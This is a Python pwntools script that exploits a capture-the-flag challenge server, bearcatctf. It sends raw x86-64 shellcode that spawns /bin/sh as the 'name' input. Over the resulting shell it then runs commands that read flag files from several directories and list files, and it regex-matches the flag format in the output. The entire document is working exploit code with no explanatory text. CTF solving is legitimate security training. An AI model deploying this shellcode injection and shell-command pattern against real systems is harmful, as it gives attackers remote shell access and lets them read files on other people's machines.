#!/usr/bin/env python3
from pwn import remote, context
import re

context.log_level = "error"

HOST = "chal.bearcatctf.io"
PORT = 40385

SHELLCODE = bytes.fromhex(
    "6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"
)

PAYLOAD = b"\x6a\x00" + SHELLCODE


def main():
    io = remote(HOST, PORT)
    io.sendline(b"3")
    io.recvuntil(b"What is your name? ")
    io.send(PAYLOAD)

    io.sendline(
        b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; "
        b"cat /home/*/flag* 2>/dev/null; ls -la"
    )
    data = io.recvrepeat(2)
    text = data.decode("latin-1", errors="ignore")
    print(text)

    matches = re.findall(r"(?:bearcat|BCCTF|ctf|flag)\{[^}\n]+\}", text, flags=re.IGNORECASE)
    if matches:
        print("\n[+] Potential flags:")
        for m in dict.fromkeys(matches):
            print(m)


if __name__ == "__main__":
    main()
